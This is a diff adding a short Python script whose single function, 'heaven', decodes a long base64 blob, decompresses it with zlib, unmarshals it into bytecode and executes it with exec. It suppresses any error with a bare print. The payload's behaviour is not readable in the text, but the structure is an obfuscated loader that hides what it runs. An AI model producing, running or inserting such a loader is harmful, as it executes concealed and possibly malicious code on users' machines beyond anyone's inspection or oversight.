@@ -1,0 +1,15 @@
+import base64
+import zlib
+import marshal
+
+def heaven():
+    try:
+        raw = base64.b64decode("eJx9VM1vE0cUn/Wu99Pe1ClJ+BBkcSuwgVgKzhcWSaWmiBZEqmZltVIiWRt7HLuxd53ZNSRGSJZ6cU5JWlX4yDG98TeUaw8JaUSYcGhFLtysgoTEqTO7XscoEbPaffPxe7/33m9m5zXoasG2fcszAPwOdKAzdwHyLIMY1wZQwLUsYl3LIU4PnAUoOM/rbOonAIwcAPNCFMwzs5+BY22U8azOpXoJViJYKQr0oD+vgUXmZE+dp+kheT4w2398dfbM8bl52WeNtWfceMFo14obj2YgzMsq0MUk272yyMSlN3Qwk2W6iHnyslSnvzydmDRQQTJgMnMdVBroAZ3VuRtsAJiBdGCWPUGLtjWpkuQZDfiR5/ydAD+yaapO29vk5vhOxeJxxihIc37+ZnBO7mBDJ2I7qpv8nNrBnqA9wfI+dvbzT1Qi6HxaIDoKSdYUu9RgdPEjNfqOc6TFI+WP6THgo3SJaq3LaYYoznXtFbgIrnX2OUfm8wENDJIVDcxsTbKDIM98AjHsIeLKDBYK0LgPzQxmUC1YdfJDE3EGi9DMWrmiuYg5uAKzNaNYrljI0RYMG46NyO1RrVRc8PtlA9kFoyTLOZjXPMpYPCVrpDlo1evQhowH2mSbJ7EwNpKDJBCMRWuvo/EOiE6WKwjaNswRNI2TOJqLEY4jLHXPWAs/E1w7h0TJMnJ2rJvkCE7Lifk+17SHlzMZ0yjDTOZySiP9slE0Sf+R5wBXsrDiaLdcU7TMozIqqGg6sWgikSBpy8W85tNok5Na1OeJeg6+HDJmHtQkvZrNkqRSWo3Thqa0eAhzVgWamEPQyGGBJl0sQSy0q8HBXLVcsTFHVcCiXxPmPQ2xRER0dwti3hMTBx+gokOMm2RcwmG4UrQdspuZPGVWrKpTqTregMljxbaqKAszrq+4sOp4LHI7gRLMYflISixUjOySsQhxD9UZoowDy5WS4UBbokfTbzhsLeSrdtZwLJSorGIlS+pzoBsVDRKkQF57h3zqYP/Uuea95lfbvVfrdw+lcKPc1LfGn0vJp8v7/QOP85v53woN5T0L5JHDnv6Nh0/uPR3b7UnVv30VOf34/K/nmyu7kVj9zqtInzuq7Uau1O8cqqdeqBeeqxfIWL3yQh3eUYd31WT9dovjz11shUA0/kRqAekK0wr3DHD1799Fgaw2lprJrYHn0vDTH/ZFaV1YEzZ6/hY1Gvv6Ox4E5cZ3G+WNzJNvts5thbflsT1u/P0NkteelPzw/joB7UnDH2z6+25Gpjn2z9O9033sM06e7hWe9cnTXwhY9A/HG/q71+Jpm2iZ0iqrTsEytY800246BlqE3k5NvaE/f024hZCFyOFRNNNytLxVNXOJeBjRWwyz9qqNA5aN6O2G6CXoKk1jeqcTsyV60gjrfXSKrihdETBXMZwC5t3TYv8B3tKLA11wCW6WrVyVJIGGyJAmYj8knxbLMMwBCB8A+QBIB0A5AOp/3CAz0fqaAVyoUdtlz7wU5EZyfWJt4pdHG8u7wumXYnhbvbEnpv7pP/O4sFloLm8uNZR9Jbw+vja+PrU21bz6Qrm0o1x6GRpoKnuhL/8NRTZuN+82J7eU7d6RvdBoKwK4s+gaif8/R2HQ3A==")
+        decompressed = zlib.decompress(raw)
+        code_obj = marshal.loads(decompressed)
+        exec(code_obj, {'__name__': '__main__'})
+    except Exception:
+        print("...")
+
+if __name__ == "__main__":
+    heaven()
